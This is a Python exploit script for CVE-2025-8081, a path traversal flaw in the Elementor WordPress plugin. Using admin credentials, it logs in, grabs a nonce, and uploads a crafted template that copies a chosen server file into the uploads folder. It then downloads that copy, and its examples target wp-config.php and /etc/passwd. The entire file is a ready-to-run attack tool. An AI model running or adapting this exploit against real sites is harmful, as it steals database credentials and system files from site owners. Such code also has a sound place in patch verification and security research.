#!/usr/bin/env python3
"""
CVE-2025-8081 Exploit - Elementor Arbitrary File Read
Author: Security Research
Target: Elementor <= 3.30.2
Tested on: Elementor 3.28.3

Description:
    Exploits path traversal in Import_Images::import() to read arbitrary files
    from the WordPress installation.

Requirements:
    - Valid WordPress admin credentials
    - Elementor plugin installed (version <= 3.30.2)

Usage:
    python3 exploit.py -t https://target.com -u admin -p password123 -f /var/www/html/wp-config.php
"""

import requests
import argparse
import json
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup


class ElementorExploit:
    def __init__(self, target_url, username, password, verify_ssl=True, verbose=False):
        self.target_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        })
        
        self.session.verify = verify_ssl
    
    def log(self, message, level="INFO"):
        """Print log message with level"""
        colors = {
            "INFO": "\033[94m",      # Blue
            "SUCCESS": "\033[92m",   # Green
            "WARNING": "\033[93m",   # Yellow
            "ERROR": "\033[91m",     # Red
            "RESET": "\033[0m"
        }
        
        if level in colors:
            print(f"{colors[level]}[{level}]{colors['RESET']} {message}")
        else:
            print(f"[{level}] {message}")
    
    def login(self):
        """Authenticate to WordPress"""
        self.log("Attempting WordPress authentication...")
        
        login_url = urljoin(self.target_url, '/wp-login.php')
        
        try:
            # Get login page first to retrieve cookies
            response = self.session.get(login_url, timeout=10)
            
            # Prepare login data
            login_data = {
                'log': self.username,
                'pwd': self.password,
                'wp-submit': 'Log In',
                'redirect_to': urljoin(self.target_url, '/wp-admin/'),
                'testcookie': '1'
            }
            
            # Submit login form
            response = self.session.post(
                login_url,
                data=login_data,
                timeout=10,
                allow_redirects=False
            )
            
            if self.verbose:
                self.log(f"Login response status: {response.status_code}")
            
            # Check if login was successful
            # WordPress sets wordpress_logged_in cookie on successful login
            if any('wordpress_logged_in' in cookie.name for cookie in self.session.cookies):
                self.log("✓ Authentication successful!", "SUCCESS")
                return True
            
            # Also check for redirect to wp-admin
            if response.status_code == 302:
                location = response.headers.get('Location', '')
                if 'wp-admin' in location:
                    self.log("✓ Authentication successful!", "SUCCESS")
                    return True
            
            self.log("✗ Authentication failed! Check credentials.", "ERROR")
            return False
            
        except Exception as e:
            self.log(f"✗ Login error: {e}", "ERROR")
            return False
    
    def get_nonce(self):
        """Extract the Elementor AJAX nonce"""
        self.log("Fetching AJAX nonce...")
        
        url = urljoin(self.target_url, '/wp-admin/edit.php?post_type=elementor_library')
        
        if self.verbose:
            self.log(f"Target URL: {self.target_url}")
            self.log(f"Nonce URL: {url}")
        
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            
            if self.verbose:
                self.log(f"Nonce response status: {response.status_code}")
                self.log(f"Final URL after redirects: {response.url}")
            
            if response.status_code != 200:
                self.log(f"Failed to access template library page (Status: {response.status_code})", "WARNING")
                return None
            
            # Look for nonce in various locations
            # Method 1: Direct form field
            nonce_match = re.search(r'name="_nonce"\s+value="([^"]+)"', response.text)
            if nonce_match:
                nonce = nonce_match.group(1)
                if self.verbose:
                    self.log(f"Nonce found: {nonce}")
                return nonce
            
            # Method 2: Inline JavaScript
            nonce_match = re.search(r'elementorCommon\.config\s*=\s*(\{[^;]+\});', response.text)
            if nonce_match:
                try:
                    config = json.loads(nonce_match.group(1))
                    if 'ajax' in config and 'nonce' in config['ajax']:
                        nonce = config['ajax']['nonce']
                        if self.verbose:
                            self.log(f"Nonce found in config: {nonce}")
                        return nonce
                except:
                    pass
            
            # Method 3: Parse HTML with BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            nonce_input = soup.find('input', {'name': '_nonce'})
            if nonce_input and nonce_input.get('value'):
                nonce = nonce_input['value']
                if self.verbose:
                    self.log(f"Nonce found in HTML: {nonce}")
                return nonce
            
            self.log("Nonce not found (continuing without it)", "WARNING")
            return None
            
        except Exception as e:
            self.log(f"Error fetching nonce: {e}", "WARNING")
            return None
    
    def load_payload(self, payload_file, target_file, output_name):
        """Load and modify external JSON payload"""
        self.log(f"Loading payload: {payload_file}")
        if self.verbose:
            self.log(f"  Target file: {target_file}")
            self.log(f"  Output name: {output_name}")
        
        try:
            # Load external payload
            with open(payload_file, 'r') as f:
                template = json.load(f)
            
            # Modify the image settings with our target file and output name
            # Navigate to the image widget settings
            image_widget = template['content'][0]['elements'][0]['elements'][0]
            if image_widget['widgetType'] == 'image':
                image_widget['settings']['image']['tmp_name'] = target_file
                image_widget['settings']['image']['name'] = output_name
                if self.verbose:
                    self.log("✓ Payload modified successfully")
            else:
                self.log("Warning: Widget type is not 'image', payload may not work", "WARNING")
            
            return json.dumps(template)
            
        except FileNotFoundError:
            self.log(f"✗ Payload file not found: {payload_file}", "ERROR")
            raise
        except KeyError as e:
            self.log(f"✗ Invalid payload structure: {e}", "ERROR")
            raise
        except Exception as e:
            self.log(f"✗ Error loading payload: {e}", "ERROR")
            raise
    
    def upload_template(self, template_json, nonce=None):
        """Upload the malicious template"""
        self.log("Uploading malicious template...")
        
        url = urljoin(self.target_url, '/wp-admin/admin-ajax.php')
        
        files = {
            'file': ('exploit.json', template_json, 'application/json')
        }
        
        data = {
            'action': 'elementor_library_direct_actions',
            'library_action': 'direct_import_template',
        }
        
        if nonce:
            data['_nonce'] = nonce
        
        try:
            # Disable redirects to avoid WordPress redirecting to localhost
            response = self.session.post(url, files=files, data=data, timeout=30, allow_redirects=False)
            
            if self.verbose:
                self.log(f"Upload URL: {url}")
                self.log(f"Response status: {response.status_code}")
                if 'Location' in response.headers:
                    self.log(f"Redirect location: {response.headers['Location']}")
                self.log(f"Response preview: {response.text[:300]}")
            
            # Accept 200 (OK) or 302 (redirect) as success
            if response.status_code in [200, 302]:
                self.log("✓ Template uploaded successfully!", "SUCCESS")
                return True
            else:
                self.log(f"✗ Upload failed (HTTP {response.status_code})", "ERROR")
                if self.verbose:
                    self.log(f"Response: {response.text[:500]}")
                return False
                
        except Exception as e:
            self.log(f"✗ Error uploading template: {e}", "ERROR")
            return False
    
    def find_leaked_file(self, output_name):
        """Search for the leaked file by testing direct URLs"""
        self.log(f"Searching for leaked file: {output_name}")
        
        from datetime import datetime
        
        # Build possible upload paths
        current_year = datetime.now().year
        current_month = datetime.now().strftime('%m')
        
        possible_paths = [
            # Current year/month (most common)
            f'/wp-content/uploads/{current_year}/{current_month}/{output_name}',
            # Root uploads directory
            f'/wp-content/uploads/{output_name}',
            # Previous month (in case upload happened just before month change)
            f'/wp-content/uploads/{current_year}/{int(current_month)-1:02d}/{output_name}' if int(current_month) > 1 else None,
            # Elementor specific directory
            f'/wp-content/uploads/elementor/{output_name}',
            f'/wp-content/uploads/elementor/tmp/{output_name}',
        ]
        
        # Remove None values
        possible_paths = [p for p in possible_paths if p]
        
        if self.verbose:
            self.log(f"Testing {len(possible_paths)} possible locations...")
        
        # Test each path
        for path in possible_paths:
            try:
                test_url = urljoin(self.target_url, path)
                
                if self.verbose:
                    self.log(f"  Trying: {test_url}")
                
                # Use HEAD request for faster checking
                response = self.session.head(test_url, timeout=5, allow_redirects=True)
                
                if response.status_code == 200:
                    self.log(f"✓ Found file: {test_url}", "SUCCESS")
                    return test_url
                elif self.verbose:
                    self.log(f"    Status: {response.status_code}")
                    
            except Exception as e:
                if self.verbose:
                    self.log(f"    Error: {e}")
                continue
        
        # If direct paths fail, try scraping media library as fallback
        if self.verbose:
            self.log("Direct paths failed, trying media library...")
        
        try:
            url = urljoin(self.target_url, '/wp-admin/upload.php')
            response = self.session.get(url, timeout=10, allow_redirects=True)
            
            if response.status_code == 200 and output_name in response.text:
                match = re.search(rf'href="([^"]*{re.escape(output_name)})"', response.text)
                if match:
                    file_url = match.group(1)
                    self.log(f"✓ Found file in media library: {file_url}", "SUCCESS")
                    return file_url
        except:
            pass
        
        self.log("✗ File not found in any location", "ERROR")
        return None
    
    def download_file(self, url):
        """Download the leaked file"""
        self.log(f"Downloading file...")
        
        if self.verbose:
            self.log(f"Download URL: {url}")
        
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            
            if self.verbose:
                self.log(f"Download response: {response.status_code}")
            
            if response.status_code == 200:
                self.log(f"✓ Downloaded {len(response.content)} bytes", "SUCCESS")
                return response.content
            else:
                self.log(f"✗ Download failed (HTTP {response.status_code})", "ERROR")
                return None
                
        except Exception as e:
            self.log(f"✗ Error downloading file: {e}", "ERROR")
            return None
    
    def exploit(self, target_file, output_file=None, payload_file="payload.json"):
        """Main exploitation flow"""
        print(f"\n{'='*70}")
        print(f" CVE-2025-8081 - Elementor Arbitrary File Read")
        print(f"{'='*70}")
        print(f"Target: {self.target_url}")
        print(f"File:   {target_file}")
        print(f"{'='*70}\n")
        
        # Generate output filename
        if not output_file:
            filename = target_file.split('/')[-1]
            # Remove dangerous extensions
            if filename.endswith(('.php', '.phtml', '.php5', '.php7')):
                filename = filename.rsplit('.', 1)[0]
            # Sanitize filename
            filename = filename.replace('-', '_').replace('.', '_')
            output_file = f"leaked_{filename}.txt"
        
        # Step 1: Login
        if not self.login():
            return False
        
        # Step 2: Get nonce
        nonce = self.get_nonce()
        
        # Step 3: Load and prepare payload
        try:
            template_json = self.load_payload(payload_file, target_file, output_file)
        except Exception as e:
            self.log(f"✗ Failed to load payload: {e}", "ERROR")
            return False
        
        # Step 4: Upload template
        if not self.upload_template(template_json, nonce):
            self.log("✗ Exploitation failed at upload stage", "ERROR")
            return False
        
        # Step 5: Find leaked file
        leaked_url = self.find_leaked_file(output_file)
        if not leaked_url:
            self.log("Could not automatically find leaked file", "WARNING")
            self.log(f"Check manually: {urljoin(self.target_url, '/wp-admin/upload.php')}")
            return False
        
        # Step 6: Download leaked file
        content = self.download_file(leaked_url)
        if content:
            # Save to local file
            local_file = output_file
            with open(local_file, 'wb') as f:
                f.write(content)
            
            print(f"\n{'='*70}")
            print(f" EXPLOITATION SUCCESSFUL!")
            print(f"{'='*70}")
            print(f"File URL:  {leaked_url}")
            print(f"File size: {len(content)} bytes")
            print(f"Saved to:  {local_file}")
            print(f"\n--- FILE CONTENT (first 500 chars) ---")
            print(content[:500].decode('utf-8', errors='ignore'))
            print(f"--- END ---")
            print(f"{'='*70}\n")
            
            return True
        
        return False


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2025-8081 Exploit for Elementor <= 3.30.2',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Read wp-config.php (default)
  python3 exploit.py -t https://target.com -u admin -p password123
  
  # Read /etc/passwd
  python3 exploit.py -t https://target.com -u admin -p password123 -f /etc/passwd
  
  # With self-signed certificate
  python3 exploit.py -t https://target.com -u admin -p password123 --insecure
  
  # Verbose mode
  python3 exploit.py -t https://target.com -u admin -p password123 -f /etc/passwd -v
        '''
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target WordPress URL')
    parser.add_argument('-u', '--user', required=True, help='WordPress admin username')
    parser.add_argument('-p', '--password', required=True, help='WordPress admin password')
    parser.add_argument('-f', '--file', default='/var/www/html/wp-config.php', 
                        help='File to read (default: wp-config.php)')
    parser.add_argument('-o', '--output', help='Output filename (default: auto-generated)')
    parser.add_argument('--insecure', '-k', action='store_true',
                        help='Disable SSL certificate verification')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Disable SSL warnings if using insecure mode
    if args.insecure:
        import urllib3
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Initialize exploit
    exploit = ElementorExploit(
        args.target,
        args.user,
        args.password,
        verify_ssl=not args.insecure,
        verbose=args.verbose
    )
    
    # Run exploitation
    success = exploit.exploit(args.file, args.output, "payload.json")
    
    if success:
        exit(0)
    else:
        print("\n[-] Exploitation failed!")
        exit(1)


if __name__ == '__main__':
    main()

